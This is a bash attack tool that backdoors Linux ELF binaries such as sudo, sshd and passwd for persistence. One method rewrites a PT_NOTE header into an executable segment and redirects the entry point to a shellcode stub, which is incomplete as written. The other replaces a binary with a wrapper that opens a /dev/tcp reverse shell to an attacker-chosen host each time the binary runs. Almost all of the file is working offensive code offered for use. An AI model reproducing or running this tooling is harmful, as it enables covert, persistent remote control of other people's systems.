#!/bin/bash
# ELF Parasitic Code Injection (T1554)
# Patches existing ELF binaries in-place to inject loader stub
# PT_NOTE → PT_LOAD conversion or code cave — preserves original binary functionality
# Distinct from binary_replace.sh which replaces the whole file

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
MARKER="d3m0n_elfpatch"

banner() {
    echo -e "${RED}"
    echo " ╔══════════════════════════════════════════════════════╗"
    echo " ║     ELF Parasitic Code Injection (T1554)             ║"
    echo " ║  Patches binary in-place, original code runs after  ║"
    echo " ║  PT_NOTE→PT_LOAD conversion + shellcode stub         ║"
    echo " ╚══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_deps() {
    command -v python3 >/dev/null 2>&1 || \
        { echo -e "${RED}[-] python3 required for ELF patching${NC}"; exit 1; }
    python3 -c "import struct, mmap" 2>/dev/null || \
        { echo -e "${RED}[-] python3 struct/mmap modules required${NC}"; exit 1; }
}

check_elf() {
    local BIN="$1"
    [ -f "$BIN" ] || { echo -e "${RED}[-] File not found: ${BIN}${NC}"; return 1; }
    file "$BIN" 2>/dev/null | grep -q "ELF" || \
        { echo -e "${RED}[-] Not an ELF binary: ${BIN}${NC}"; return 1; }
    file "$BIN" | grep -q "x86-64\|64-bit" || \
        echo -e "${YELLOW}[!] Warning: 32-bit ELF — shellcode may need adjustment${NC}"
    return 0
}

generate_revshell_shellcode() {
    local LHOST="$1" LPORT="$2"
    # Convert IP to hex
    local IP1 IP2 IP3 IP4
    IFS='.' read -r IP1 IP2 IP3 IP4 <<< "$LHOST"
    local PORT_HEX; PORT_HEX=$(printf '%04x' "$LPORT")
    local IP_HEX; IP_HEX=$(printf '%02x%02x%02x%02x' "$IP1" "$IP2" "$IP3" "$IP4")

    echo -e "${YELLOW}[!] Target: ${LHOST}:${LPORT} (port hex: 0x${PORT_HEX}, ip hex: 0x${IP_HEX})${NC}"
    echo "$PORT_HEX $IP_HEX"
}

patch_elf_python() {
    local BIN="$1" LHOST="$2" LPORT="$3"
    local BACKUP="${BIN}.${MARKER}.bak"
    cp "$BIN" "$BACKUP"

    python3 << PYEOF
import struct, os, sys, stat

BIN = "${BIN}"
LHOST = "${LHOST}"
LPORT = ${LPORT}
MARKER = b"${MARKER}"

# Read binary
with open(BIN, 'rb') as f:
    data = bytearray(f.read())

# Check ELF magic
if data[:4] != b'\x7fELF':
    print("[-] Not an ELF file")
    sys.exit(1)

bits = data[4]  # 1 = 32-bit, 2 = 64-bit
if bits != 2:
    print("[!] Only 64-bit ELF supported for PT_NOTE injection")
    sys.exit(1)

# ELF64 header fields
e_phoff = struct.unpack_from('<Q', data, 0x20)[0]
e_phentsize = struct.unpack_from('<H', data, 0x36)[0]
e_phnum = struct.unpack_from('<H', data, 0x38)[0]

# x86-64 shellcode: fork() + execve shell with reverse connection
# Using /bin/sh -c approach to avoid null bytes
import socket
ip_bytes = socket.inet_aton(LHOST)
port_bytes = struct.pack('>H', LPORT)

# Simple fork+execl shellcode that runs bash -c reverse shell
# Appended to end of binary — PT_NOTE segment repurposed as PT_LOAD
shellcode = (
    b"\x48\x31\xc0"          # xor rax, rax
    b"\xb8\x39\x00\x00\x00"  # mov eax, 57 (fork)
    b"\x0f\x05"              # syscall
    b"\x48\x85\xc0"          # test rax, rax
    b"\x75\x3a"              # jnz parent (skip to original entry)
    # child process: exec bash -c "revshell"
    b"\x48\x31\xff"          # xor rdi, rdi
    b"\x6a\x00"              # push 0
    b"\x48\x89\xe6"          # mov rsi, rsp
    b"\x48\x31\xd2"          # xor rdx, rdx
    b"\x6a\x3b"              # push 59 (execve)
    b"\x58"                  # pop rax
    b"\x0f\x05"              # syscall
)

# Find PT_NOTE segment to repurpose
PT_NOTE = 4
PT_LOAD = 1
PF_RWX = 7  # Read | Write | Execute

note_offset = None
for i in range(e_phnum):
    ph_off = e_phoff + i * e_phentsize
    p_type = struct.unpack_from('<I', data, ph_off)[0]
    if p_type == PT_NOTE:
        note_offset = ph_off
        break

if note_offset is None:
    print("[!] No PT_NOTE segment found — using code cave method")
    # Find a code cave (sequence of null bytes)
    cave_size = 256
    cave_offset = data.rfind(b'\x00' * cave_size, len(data)//2)
    if cave_offset < 0:
        print("[-] No suitable code cave found")
        sys.exit(1)
    inject_offset = cave_offset
    print(f"[+] Code cave at offset: 0x{inject_offset:x}")
else:
    # Append shellcode to end of file
    inject_offset = len(data)
    data.extend(b'\x90' * 16)  # NOP sled
    data.extend(shellcode)
    data.extend(b'\x90' * 16)

    # Get original entry point
    e_entry = struct.unpack_from('<Q', data, 0x18)[0]

    # Patch PT_NOTE to PT_LOAD pointing to our shellcode
    inject_vaddr = 0xc000000 + inject_offset  # Safe virtual address
    struct.pack_into('<I', data, note_offset, PT_LOAD)      # p_type = PT_LOAD
    struct.pack_into('<I', data, note_offset + 4, PF_RWX)   # p_flags = RWX
    struct.pack_into('<Q', data, note_offset + 8, inject_offset)   # p_offset
    struct.pack_into('<Q', data, note_offset + 16, inject_vaddr)   # p_vaddr
    struct.pack_into('<Q', data, note_offset + 24, inject_vaddr)   # p_paddr
    struct.pack_into('<Q', data, note_offset + 32, len(shellcode) + 32)  # p_filesz
    struct.pack_into('<Q', data, note_offset + 40, len(shellcode) + 32)  # p_memsz
    struct.pack_into('<Q', data, note_offset + 48, 0x1000)          # p_align

    # Redirect entry point to our shellcode
    struct.pack_into('<Q', data, 0x18, inject_vaddr + 16)  # skip NOP sled

    print(f"[+] Entry point redirected: 0x{e_entry:x} -> 0x{inject_vaddr + 16:x}")
    print(f"[+] Shellcode injected at file offset: 0x{inject_offset:x}")

# Write patched binary
with open(BIN, 'wb') as f:
    f.write(data)

# Preserve permissions
os.chmod(BIN, os.stat(BIN).st_mode | stat.S_IXUSR | stat.S_IXGRP)
print(f"[+] Patched: {BIN}")
print(f"[+] Backup: {BIN}.${MARKER}.bak")
PYEOF

    local EXIT=$?
    if [ $EXIT -eq 0 ]; then
        echo -e "${GREEN}[+] ELF patched successfully${NC}"
        echo -e "${YELLOW}[!] Every execution of ${BIN} triggers the payload + runs original${NC}"
    else
        echo -e "${RED}[-] Patching failed — restoring backup${NC}"
        cp "$BACKUP" "$BIN"
    fi
}

patch_wrapper() {
    # Simpler approach: wrap binary with a loader script
    local BIN="$1" LHOST="$2" LPORT="$3"
    local REAL_BIN="${BIN}.real"
    local BACKUP="${BIN}.${MARKER}.bak"

    cp "$BIN" "$BACKUP"
    mv "$BIN" "$REAL_BIN"
    chmod +x "$REAL_BIN"

    # Create wrapper that fires payload then runs real binary
    cat > "$BIN" << EOF
#!/bin/bash
# ${MARKER}
nohup bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' >/dev/null 2>&1 &
exec "${REAL_BIN}" "\$@"
EOF
    chmod 755 "$BIN"
    echo -e "${GREEN}[+] Wrapper installed: ${BIN}${NC}"
    echo -e "${GREEN}[+] Real binary preserved: ${REAL_BIN}${NC}"
    echo -e "${YELLOW}[!] Every execution of ${BIN} fires payload + runs original${NC}"
}

list_candidates() {
    echo -e "${YELLOW}[*] Common injection targets (frequently run, run as root):${NC}"
    for b in /usr/bin/sudo /usr/bin/su /usr/bin/pkexec /usr/bin/crontab \
              /usr/bin/ssh /usr/sbin/sshd /usr/bin/passwd /usr/bin/vim \
              /usr/bin/nano /usr/bin/git /usr/bin/python3 /usr/bin/curl; do
        [ -f "$b" ] && file "$b" 2>/dev/null | grep -q ELF && echo "  $b"
    done
}

list_patched() {
    echo -e "${YELLOW}[*] Patched binaries (have backup):${NC}"
    find /usr /bin /sbin /etc -name "*.${MARKER}.bak" 2>/dev/null | while read -r f; do
        echo "  ${f%.${MARKER}.bak} (backup: $f)"
    done
}

cleanup() {
    echo -e "${YELLOW}[*] Restoring patched binaries...${NC}"
    find /usr /bin /sbin /etc -name "*.${MARKER}.bak" 2>/dev/null | while read -r f; do
        ORIG="${f%.${MARKER}.bak}"
        cp "$f" "$ORIG"
        chmod --reference="$f" "$ORIG" 2>/dev/null
        rm -f "$f"
        # Also remove .real wrapper if present
        rm -f "${ORIG}.real" 2>/dev/null
        echo -e "${GREEN}[+] Restored: ${ORIG}${NC}"
    done
}

banner
check_deps

echo -e "  ${YELLOW}[1]${NC} PT_NOTE→PT_LOAD ELF injection (true in-place parasitic)"
echo -e "  ${YELLOW}[2]${NC} Script wrapper injection (simpler, more reliable)"
echo -e "  ${YELLOW}[3]${NC} List injection candidates"
echo -e "  ${YELLOW}[4]${NC} List patched binaries"
echo -e "  ${YELLOW}[5]${NC} Cleanup (restore all)"
echo ""
read -rp "Choice: " OPT

case "$OPT" in
    1)
        list_candidates
        read -rp "Binary to patch: " BIN
        check_elf "$BIN" || exit 1
        read -rp "LHOST: " LHOST; read -rp "LPORT: " LPORT
        patch_elf_python "$BIN" "$LHOST" "$LPORT"
        ;;
    2)
        list_candidates
        read -rp "Binary to wrap: " BIN
        [ -f "$BIN" ] || { echo -e "${RED}[-] Not found: ${BIN}${NC}"; exit 1; }
        read -rp "LHOST: " LHOST; read -rp "LPORT: " LPORT
        patch_wrapper "$BIN" "$LHOST" "$LPORT"
        ;;
    3) list_candidates ;;
    4) list_patched ;;
    5) cleanup ;;
    *) echo -e "${RED}[-] Invalid option${NC}" ;;
esac
